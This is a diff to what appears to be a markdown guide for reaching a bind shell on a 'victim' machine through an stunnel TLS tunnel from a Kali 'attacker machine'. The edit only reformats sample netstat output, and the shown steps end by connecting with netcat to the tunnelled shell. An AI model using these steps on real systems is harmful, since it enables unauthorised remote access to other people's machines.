@@ -30,12 +30,12 @@ In our attacker machine (Kali Linux) we will use stunnel (since the server requi
 1. check if it's running (optional)
 	1. netstat -tulp
 	
-	the output should be similar to:
+	>the output should be similar to:
 	
-	Active Internet connections (only servers)
-	Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
-	tcp        0      0 localhost:8443          0.0.0.0:*               LISTEN      1156/stunnel4       
-	tcp6       0      0 localhost:8443          [::]:*                  LISTEN      1156/stunnel4       
+	>Active Internet connections (only servers)
+	>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+	>tcp        0      0 localhost:8443          0.0.0.0:*               LISTEN      1156/stunnel4       
+	>tcp6       0      0 localhost:8443          [::]:*                  LISTEN      1156/stunnel4       
 
 1. presuming that you already lunched the bindshell on the victim you can connect to it through the tunnel:
 	1. nc localhost 8443
